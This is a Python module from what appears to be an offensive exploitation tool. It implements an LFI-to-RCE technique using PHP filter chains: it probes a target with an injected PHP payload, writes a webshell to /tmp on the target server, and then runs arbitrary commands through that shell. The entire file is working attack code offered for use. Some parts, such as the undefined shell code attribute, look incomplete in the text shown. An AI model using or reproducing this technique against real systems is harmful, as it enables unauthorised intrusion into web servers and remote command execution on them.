import base64
import logging
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Dict

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase
from ..payloads.filter_chain import generate_filter_chain

logger = logging.getLogger("elle-est-fit")


class PHPFilterTechnique(TechniqueBase):
    name = "php_filters"
    description = "LFI to RCE via PHP filter chain"
    
    def __init__(self, **kwargs):
        """Initialize the PHP filter technique."""
        super().__init__(**kwargs)
        self.wrapper_path = "php://temp"
        self.shell_token = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
    
    def check(self) -> bool:
        logger.info("Checking if target is vulnerable to PHP filter technique")
        
        test_payload = f"<?php echo '{self.detection_string}'; ?>"
        filter_chain = generate_filter_chain(test_payload)
        
        result = self.leak_function(filter_chain)
        
        if self.detection_string in result:
            logger.info("Target is vulnerable to PHP filter technique")
            return True
        else:
            logger.info("Target does not appear vulnerable to PHP filter technique")
            return False
    
    def exploit(self) -> bool:
        logger.info("Exploiting using PHP filter technique")
        
        # Create a webshell payload
        shell_filename = f"/tmp/shell_{self.shell_token}.php"
        
        payload = f"""<?php
        $shell_code = '<?php {self.php_code} ?>';
        file_put_contents('{shell_filename}', $shell_code);
        echo "SHELL_CREATED:{shell_filename}";
        ?>"""
        
        filter_chain = generate_filter_chain(payload)
        result = self.leak_function(filter_chain)
        
        if "SHELL_CREATED:" in result:
            match = re.search(r"SHELL_CREATED:(.*)", result)
            if match:
                self.shell_path = match.group(1).strip()
                logger.info(f"Shell created at {self.shell_path}")
                return True
        
        logger.error("Failed to create shell via PHP filter technique")
        return False
    
    def execute(self, command: str) -> str:
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")
        encoded_command = urllib.parse.quote(command)
        
        payload = f"""<?php
        $output = '';
        if (file_exists('{self.shell_path}')) {{
            ob_start();
            include '{self.shell_path}';
            $output = ob_get_clean();
        }} else {{
            $output = 'Shell file not found at {self.shell_path}';
        }}
        echo "CMD_OUTPUT_START\\n" . $output . "\\nCMD_OUTPUT_END";
        ?>"""
        
        filter_chain = generate_filter_chain(payload)
        result = self.leak_function(filter_chain + f"&cmd={encoded_command}")
        
        match = re.search(r"CMD_OUTPUT_START\n(.*?)\nCMD_OUTPUT_END", result, re.DOTALL)
        if match:
            return match.group(1)
        else:
            raise ExecutionError("Failed to execute command or parse output")